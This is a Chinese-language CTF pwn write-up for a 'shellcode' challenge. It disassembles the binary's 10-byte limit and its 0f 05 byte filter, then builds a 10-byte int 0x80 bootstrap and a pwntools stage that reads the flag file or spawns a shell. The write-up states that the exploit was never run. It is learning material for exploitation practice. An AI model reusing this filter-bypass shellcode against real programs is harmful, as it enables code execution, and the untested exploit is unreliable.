# shellcode — Writeup

> 平台未在附件中标注（题号 18，附件名 `PWN附件`） · 分类：Pwn（shellcode / 指令过滤） · 难度：★★★★☆

| 项目 | 内容 |
|---|---|
| 题目名 | shellcode |
| 分类 | Pwn / 直接执行 shellcode |
| 附件 | `shellcode`（ELF64 PIE，16536 字节） |
| 一句话 | 只给你 10 个字节的 shellcode，还用 `memmem` 把 `0f 05` 堵死了，逼你换一条 syscall 指令 |
| 结果 | 未完成（exp 已写出，本机无法运行 ELF，见第六节） |

**最终答案**

```
（未取得 flag；本机是 Windows + 无 pwntools，exp 未运行验证）
```

## 一、题目长什么样（先建立直觉）

一个 16 KB 的 ELF64 动态链接程序，PIE、Full RELRO（`BIND_NOW`）、`GNU_STACK RW`（NX 开）。导入表干净得可疑——只有 `open` / `read` / `close` / `mmap` / `memmem` / `printf` / `puts` / `setvbuf` / `exit` / `__stack_chk_fail`，**没有 `system`、没有 `execve`、没有 `prctl` 或 `seccomp`**。

这种导入表基本只有一种含义：程序自己 `mmap` 一块可执行内存，把用户输入当代码跳进去。真正要看的只有 `main`。

## 二、思路总览

`main` 的逻辑一句话：**用 `/dev/urandom` 生成一个页对齐地址，`mmap` 一页 RWX，读 10 个字节进去，检查里面有没有 `0f 05`（`syscall`），没有就 `call rax` 跳进去执行。**

所以约束有两条：长度 10 字节、指令字节里不许出现 `0f 05`。第二阶段的 shellcode 不受这两条限制（检查只做一次），于是整题变成"用 10 个字节，造出一次能读入更多字节的 syscall"。

1. 静态分析确定 mmap 的地址来源与寄存器现场；
2. 发现 `cd 80`（`int 0x80`）既不是 `0f 05`，也只要 2 字节——这就是作者留的门；
3. 数一数 `push rax; pop rcx; xor ebx,ebx; xor eax,eax; mov dl,0xff; int 0x80` 正好 10 字节，长度预算与方案尺寸完全吻合，反证这是预期解法；
4. 第二阶段落点算清楚（`int 0x80` 之后从 `buf+0xa` 继续执行）；
5. 第二阶段爱干什么干什么（ORW 或 `execve("/bin/sh")`），因为它已经越过检查。

## 三、逐步复现

### 3.1 第一步：确认保护与导入

```
ELF64 / Type: DYN（PIE）/ FLAGS_1: NOW PIE
GNU_STACK: RW（不可执行 → NX 开）
FLAGS: BIND_NOW（Full RELRO）
导入：open read close mmap memmem printf puts setvbuf exit __stack_chk_fail
```

怎么读这个输出：NX、Canary、Full RELRO 在这里**都是干扰项**——没有栈溢出，没有 GOT 可写需求，因为目标内存是程序自己 `mmap(PROT_EXEC)` 出来的。真正有用的信息是"没有 seccomp 相关导入"，说明第二阶段可以随便 `syscall`。

### 3.2 第二步：读 `main`，把约束钉死

`main` 在 `0x12f4`，长度 333 字节（到 `0x1441`）。关键片段：

```
1319: mov esi,0x0
131e: lea rax,[rip+0xcdf]        # 2004  "/dev/urandom"
132d: call open@plt
1332: mov [rbp-0x1c],eax
134a: lea rcx,[rbp-0x18]
1351: mov edx,0x5
135b: call read@plt              # read(fd, rbp-0x18, 5)
1379: call close@plt
137e: mov rax,[rbp-0x18]
1382: and rax,0xfffffffffffff000  # 页对齐
1394: mov ecx,0x22               # MAP_PRIVATE|MAP_ANONYMOUS
1399: mov edx,0x7                # PROT_READ|WRITE|EXEC
139e: mov esi,0x1000
13a6: call mmap@plt
13c5: lea rax,[rip+0xc69]        # 2035  "input: "
13d4: call printf@plt
13d9: mov rax,[rbp-0x10]
13dd: mov edx,0xa                # 只读 10 字节！
13ea: call read@plt
13ef: mov rax,[rbp-0x10]
13f3: mov ecx,0x2
13f8: lea rdx,[rip+0xc3e]        # 203d  "\x0f\x05"
13ff: mov esi,0xa
1407: call memmem@plt            # 在 10 字节里找 syscall 机器码
140c: test rax,rax
140f: je   1420
1411: lea rax,[rip+0xc28]        # 2040  ":("
141b: call err
1420: mov rax,[rbp-0x10]
1424: call rax                   # 跳进 shellcode
1426: mov eax,0x0                # 返回点
```

`.rodata` 里也能直接看到这条 needle：

```
2000 01000200 2f646576 2f757261 6e646f6d   ..../dev/urandom
2030 696c6564 00696e70 75743a20 000f0500   iled.input: ....
2040 3a2800                                 :(.
```

怎么读这个输出：

- `mov edx,0xa` 硬编码 → **只有 10 字节**；
- `memmem(buf, 10, "\x0f\x05", 2)` → **字节序列 `0f 05` 出现即死**；
- `mmap` 的第一个参数来自 5 字节 urandom 再 `& ~0xfff`，flags 是 `0x22`（**没有 `MAP_FIXED`**），所以它只是"建议地址"，内核可能换地方。结论：**你不知道 shellcode 会落在哪**。但不需要知道——`call rax` 时 `rax` 就是那个地址。

### 3.3 第三步：算清 `call rax` 时刻的寄存器现场

`read(0, buf, 0xa)` 返回后紧接着 `call rax`（因为 `[rbp-0x10]` 就是 `buf`）。所以进入 shellcode 时：

- `rax` = `buf`（mmap 地址，未知但已知道）；
- `rdi` = `0`（fd）、`rsi` = `buf`、`rdx` = `0xa`（`read` 是薄封装，实践中不动这三个，但这是"实践"不是语言保证）；
- `rsp` 指向 `main` 的返回地址 `PIE + 0x1426`；
- `rbp` 仍是 `main` 的帧。

这组现场是后续所有方案的出发点：`rax` 兜着缓冲区地址，不用自己算。

### 3.4 第四步：为什么 `int 0x80` 是唯一可行的一跳

先把"不行"的方案排除掉：

| 想法 | 为什么不行 |
|---|---|
| `ret2plt` 调 `read@plt` | PIE 基址未知；从 `[rsp]` 反推基址再调用，远超 10 字节 |
| `mov rsp, rax; ret` 做栈迁移 | mmap 页除我们 10 字节外全是 0，`ret` 取出的地址高 2 字节为 0，必崩 |
| 改 `[rsp]` 低两字节 `ret` 回 `main+0xe5` 再读 10 字节 | 确实只要 6~10 字节能拼出来，但每轮仍然只读 10 字节、仍然要过 `memmem`，是死循环不是进展 |
| `sysenter`（`0f 34`） | 同样能过过滤（不是 `0f 05`），但 32 位 ABI，问题与 `int 0x80` 相同，没有优势 |

再数一遍 `int 0x80` 方案：

```
50           push rax          ; rax = buf
59           pop  rcx          ; rcx = buf  （int 0x80 的 ecx 参数）
31 db        xor  ebx,ebx      ; ebx = 0    （fd = stdin）
31 c0        xor  eax,eax      ; eax = 0    （__NR_read，32 位 ABI）
b2 ff        mov  dl,0xff      ; edx 低字节 = 255（长度）
cd 80        int  0x80         ; 32 位 ABI 的 read
```

**正好 10 字节**，且字节序列里没有 `0f`、也没有 `05`。长度预算和方案尺寸精确吻合——这就是"预期解法"最强的旁证。

注意顺序：必须先把 `rax` 搬到 `rcx`，再 `xor eax,eax`；否则缓冲区地址就没了。

### 3.5 第五步：第二阶段的落点

`int 0x80` 返回后，CPU **从 `int 0x80` 的下一条指令继续**，也就是 `buf + 0xa`。而这次 `read` 把新数据写在 `buf + 0` 起。

所以数据流是：

```
发送：  [10 字节 bootstrap] + [10 字节填充] + [第二阶段 shellcode]
         ↑ 第一次 read 吃掉        ↑ 第二次 read 从 buf+0 开始写
执行：  bootstrap → int 0x80 → read → 回到 buf+0xa → 这里正好是第二阶段的开头
```

也就是说第二阶段的 payload 前面**必须垫 10 个字节**（它们会被写到 `buf+0..0xa`，永远不会被执行，因为我们从 `0xa` 开始跑）。

第二阶段已经越过 `memmem` 检查（只查一次），可以直接用 `syscall`：

```python
from pwn import *
context.arch = 'amd64'

orw = asm(shellcraft.open('./flag') +
          shellcraft.read('rax', 'rsp', 0x100) +
          shellcraft.write(1, 'rsp', 0x100))

bootstrap = bytes.fromhex('5059' '31db' '31c0' 'b2ff' 'cd80')   # 10 字节
payload   = bootstrap + b'\x90' * 10 + orw
```

`execve("/bin/sh")` 版本同理，把 `orw` 换成 `asm(shellcraft.sh())`，然后 `p.interactive()`。

### 3.6 第六步：为什么没有跑起来

本机是 Windows，装的是 `mingw64` 的 `readelf` / `objdump`（能读 ELF，不能执行），Python 里没有 pwntools。所以上面这段 exp 是**静态推导 + 逐字节手算**的产物，没有真机回显。风险点写在第六节。

## 四、关键知识点

| 概念 | 是什么 | 这题为什么用它 | 以后在哪还会遇到 |
|---|---|---|---|
| `call rax` 直跳 | 程序把 mmap 的 RWX 页当函数指针调用 | 整题的入口 | 所有"输入即代码"的 shellcode 题 |
| 指令字节过滤 | `memmem` 找 `0f 05` | 逼你放弃最顺手的 `syscall` | 所有 shellcode 沙箱题（还有过滤 `cd 80`、`0f 34` 的变体） |
| `int 0x80` on x86-64 | 64 位进程里走 IA32 兼容路径，2 字节 | 唯一能在 2 字节内发起 syscall 的指令 | 极小 shellcode 题、长度受限题 |
| 两阶段 shellcode | 第一段只负责"再读一次"，第二段做正事 | 10 字节装不下 ORW | 几乎所有短 shellcode 题 |
| mmap 作为 hint | `flags=0x22` 无 `MAP_FIXED`，地址只是建议 | 解释了"为什么地址不可预测" | 判断 mmap 返回地址是否可控时 |
| 寄存器现场 | `call rax` 前 `rax/rsi/rdx` 的值 | 省下"取缓冲区地址"的字节 | 所有受限 shellcode 题的第一件事 |

## 五、踩坑与陷阱

1. **千万别写成 `mov ecx, eax` 再 `xor eax,eax`**。`mov ecx,eax` 是 2 字节没错（89 c1），但先 `push rax; pop rcx` 更短也更不容易踩到 64 位截断。
2. **`rdx` 的高位是脏的**。`mov dl,0xff` 只改低 8 位，`rdx` 高位来自 `memmem`，所以"长度"可能是天文数字。好消息是内核在 `rw_verify_area` 里会把 `count` 夹到 `MAX_RW_COUNT`（0x7ffff000），而 socket/pipe 的 `read` 只拷贝"当前可读"的字节，所以发送量控制在 4096 以内就安全；坏消息是**如果 stdin 是普通文件**，`read` 会真的去填满 count，可能越过那一页撞上 `EFAULT`。
3. **第二阶段开头的 10 字节不是浪费**。它是被第二次 `read` 覆盖掉的区域，必须占位；把它当"能省"的字节会导致第二阶段入口错位 10 字节，全盘崩。
4. **`int 0x80` 的指针宽度是本题最大的不确定性**。32 位 ABI 下 `ecx` 只有 32 位，而 mmap 地址来自 40 位 urandom，绝大多数情况在 4 GB 之上。这一条属于"必须真机验证"的范畴，见第六节。

## 六、卡点与正解方向

**已确认（有 `objdump` 字节码支撑）**

- 保护：PIE + Full RELRO + NX + Canary，但目标是自行 mmap 的 RWX；
- 约束：`read(0, buf, 0xa)` 硬编码 10 字节；
- 过滤：`memmem(buf, 10, "\x0f\x05", 2)`，命中就 `err(":(")` 退出；
- 跳转：`0x1424: call rax`，`rax = buf`；
- 缺口：`cd 80`（`int 0x80`）与 `0f 34`（`sysenter`）都不在过滤名单里。

**卡在哪**

本机无法运行 ELF、没有 pwntools，exp 一次都没跑过。最关键的未验证点是：**x86-64 下 `int 0x80` 是否接受 64 位的 `rcx` 指针**。

**正解方向**

1. **先把确定性补上**。在 Linux 上写个 20 行的 C 程序，`mmap` 一块 `0x7f...` 的页，用 `int 0x80` 做一次 `read` 到那块地址，看返回值和 errno。这一步在 5 分钟内能给出"能用 / 不能用"的定论，比任何猜测都值钱。
2. **如果指针被截断**，两个备选：
   - 换 `int 0x80` 的目标为**低地址**：10 字节内做不到 `mmap` 低地址 + 读入，但可以反过来利用 `read` 的"长度不受控"去做 `write`（`__NR_write` 也是 `eax=4`），把 `buf` 前几十字节打出来当 leak；
   - 或者干脆放弃"再读一次"，把 10 字节用于**改写 `[rsp]` 低两字节**跳回 `main+0xe5`（`0x13d9`，即 `read(0, buf, 0xa)` 之前），配合 `rbp` 未被破坏这一点，把 `main` 的读循环变成可控节奏（这条路我在会话里推过，结论是"每轮仍限 10 字节"，除非能同时改 `edx`）。
3. **拿到 shell 后 flag 路径**按常规先试 `./flag`、`/flag`、`/flag.txt`，ORW 版本最好写成"依次尝试多个文件名"以省一次重连。

## 七、赛场 20 分钟行动清单

1. `readelf -h -l -d -s` + `objdump -d` 只看 `main`，把"读多少、过滤什么、跳到哪"三件事写下来（5 分钟）。
2. 认出 `0f 05` 过滤 → 立刻想 `cd 80` / `0f 34`（2 分钟）。
3. 数长度：`50 59 31 db 31 c0 b2 ff cd 80` = 10，对上预算就开写（5 分钟）。
4. 第二阶段直接 `asm(shellcraft.open+read+write)`，注意前面垫 10 字节（5 分钟）。
5. 先本地 `process('./shellcode')` 打一枪，看能不能进第二阶段，再上 remote（3 分钟）。

> 超过 30 分钟还没进第二阶段，先怀疑"`int 0x80` 指针宽度"，去做第六节的 20 行验证程序，别硬猜。

## 八、附件与脚本

- `files/tempdir/PWN附件/shellcode`：题目原始 ELF（16536 字节），只读，未改动；
- 本文所有地址、字节、`.rodata` 内容均来自对该文件执行 `readelf` / `objdump -d -M intel` 的真实输出；
- exp 未落盘（本机无 pwntools），正文 3.5 的 `bootstrap` 与 `payload` 拼接逻辑可直接粘进 Linux 环境运行；
- 建议在 Linux 上新建 `exp_shellcode.py`，把 3.5 的代码补上 `p = process('./shellcode')` / `p = remote(host, port)` 与 `p.send(payload)` 即可。

> 说明：本题 flag 未取得，正文不含任何虚构回显。
